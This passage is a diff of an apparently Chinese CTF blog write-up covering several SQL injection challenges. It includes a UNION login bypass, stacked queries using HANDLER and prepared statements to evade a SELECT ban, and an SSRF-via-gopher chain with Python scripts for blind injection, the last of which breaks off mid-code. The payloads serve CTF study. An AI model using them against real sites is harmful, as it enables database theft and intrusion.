function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>	<span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br>	<span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br>	<span class="hljs-keyword">if</span> (!username || !password)<br>		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Invalid Login&quot;</span>);<br>	<br>	<span class="hljs-keyword">try</span> &#123;<br>		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">attemptLogin</span>(username, password));<br>	&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>		<span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(err);<br>	&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>	res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;not found&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>	<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure>
 
 <p>本题重点在第29行这个回调函数，从数据库调数据与用户输入进行比对，那就看看这个后端判断登录的逻辑是什么样的吧：</p>
@@ -433,7 +44,7 @@
 
 <p>大概users里存着三个字段：username、password、fav_color。<code>getColor()</code>方法是当用户登陆成功后查询登录账户最喜欢的颜色并返回，题目要求使用admin登录，盲猜admin最喜欢的颜色就是flag啦（。</p>
 <p>再回到登录验证部分。那么怎么样才能输入用户名”admin”，然后输入密码对应的是”admin”对应的密码呢？一开始陷入了这个思维陷阱没跳出来，实际上，可以这样：</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">username:*&#x27; UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;123&quot;</span><span class="hljs-comment">--+</span><br>password:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username:*&#x27; UNION SELECT &quot;admin&quot;,&quot;123&quot;--+<br>password:123<br></code></pre></td></tr></table></figure>
 
 <p>用户名中的”*”指的是一个数据库中不存在的用户名，空着也行，然后单引号闭合。SELECT “admin” 和 “123”，最后”–+”闭合语句，这样一来整个sql语句的查询结果就变成了</p>
 <table>
@@ -450,21 +61,21 @@
 </tbody></table>
 <p>那么当用户输入密码为”123”自然就等于row.password了，登陆成功。</p>
 <p>为便于理解，我们本地创建一个表<code>user_info</code>，表如下：</p>
-<p><img src="/2023/02/09/SQLI/image-20230412122726143.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412122726143.png"></p>
 <p>本地测试结果如下：</p>
-<p><img src="/2023/02/09/SQLI/image-20230412123052991.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412123052991.png"></p>
 <p>表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下：</p>
-<p><img src="/2023/02/09/SQLI/image-20230412123949128.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412123949128.png"></p>
 <p>当然，要学会善于利用工具（，话不多说，上图</p>
-<p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg"></p>
 <p>这道题用sqlmap也能直接淦出来。厚礼蟹</p>
 <hr>
 <h2 id="BUUCTF-EasySql"><a href="#BUUCTF-EasySql" class="headerlink" title="BUUCTF-EasySql"></a>BUUCTF-EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213012236141.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213012236141.png"></p>
 <p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213013114976.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213013114976.png"></p>
 <p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213013848916.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213013848916.png"></p>
 <p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p>
 <p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p>
 <p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p>
@@ -472,10 +83,10 @@
 <p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p>
 <hr>
 <h2 id="BUUCTF-easy-sql"><a href="#BUUCTF-easy-sql" class="headerlink" title="BUUCTF-easy_sql"></a>BUUCTF-easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p>
-<p><img src="/2023/02/09/SQLI/image-20230213133221152.png" srcset="/img/loading.gif" lazyload></p>
-<p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/02/09/SQLI/image-20230213140043405.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213133221152.png"></p>
+<p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/02/09/SQLI/image-20230213140043405.png"></p>
 <p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213140715876.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213140715876.png"></p>
 <p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
 
@@ -483,12 +94,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 <p>还是没绕过，暂时放弃这条路。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213143545653.png" srcset="/img/loading.gif" lazyload></p>
-<p>查找学习show databases爆数据库名。<img src="/2023/02/09/SQLI/image-20230213144232143.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213143545653.png"></p>
+<p>查找学习show databases爆数据库名。<img src="/2023/02/09/SQLI/image-20230213144232143.png"></p>
 <p>show tables爆表名，好臭的表名啊(。</p>
-<p><img src="/2023/02/09/SQLI/image-20230213144433988.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213144433988.png"></p>
 <p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p>
-<p><img src="/2023/02/09/SQLI/image-20230213144916052.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213144916052.png"></p>
 <p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure>
 
@@ -497,7 +108,7 @@
 <p>最终构造payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230213152804918.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213152804918.png"></p>
 <p>拿到flag。</p>
 <p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p>
 <p>预编译相关语法：</p>
@@ -514,33 +125,33 @@
 <p>构造</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230213160841525.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213160841525.png"></p>
 <p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2023/02/09/SQLI/image-20230213161126295.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213161126295.png"></p>
 <p>十六进制绕过的步骤如下：</p>
 <p>打开mysql命令行输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230213162154710.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213162154710.png"></p>
 <p>得到一串十六进制字符串。</p>
 <p>构造预处理语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure>
 
 <p>set同样大写绕过，payload：</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1&#x27;;Set @abc=0x73656C656374202A2066726F6D20603139313938313039333131313435313460;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是191981093114514打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230213163140720.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213163140720.png"></p>
 <p>GET到flag；</p>
 <p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p>
-<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;;show columns from `words`;#<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="/2023/02/09/SQLI/image-20230213164015355.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230213164015355.png"></p>
 <p>推测回显内容来自于data字段；</p>
 <p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p>
 <p>相关语句如下：</p>
@@ -558,7 +169,7 @@
 
 <hr>
 <h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p>
-<p><img src="/2023/02/09/SQLI/image-20230410150245999.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230410150245999.png"></p>
 <p>​	SQLI页面中的内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure>
 
@@ -568,14 +179,14 @@
 <p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p>
 <p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p>
 <p>gopher协议的格式：</p>
-<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gopher://&lt;host&gt;:&lt;port&gt;/_后接TCP数据流<br></code></pre></td></tr></table></figure>
 
 <p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p>
 <p>GET请求：</p>
 <p>准备好一个监听机和一个用户机：</p>
-<p><img src="/2023/02/09/SQLI/image-20230410153558433.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230410153558433.png"></p>
 <p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p>
-<p><img src="/2023/02/09/SQLI/image-20230410182351129.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230410182351129.png"></p>
 <p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure>
 
@@ -600,13 +211,13 @@
 
 <p>现在回到本题；</p>
 <p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p>
-<p><img src="/2023/02/09/SQLI/image-20230410194114453.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230410194114453.png"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure>
 
 <p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p>
-<p><img src="/2023/02/09/SQLI/image-20230410201414804.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230410201414804.png"></p>
 <p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p>
-<p><img src="/2023/02/09/SQLI/image-20230411013245234.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230411013245234.png"></p>
 <p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
@@ -627,26 +238,26 @@
 <p>数据库rua、表flag、字段flag，爆flag内容：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/SQLI/image-20230412103314980.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/SQLI/image-20230412103314980.png"></p>
 <p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span 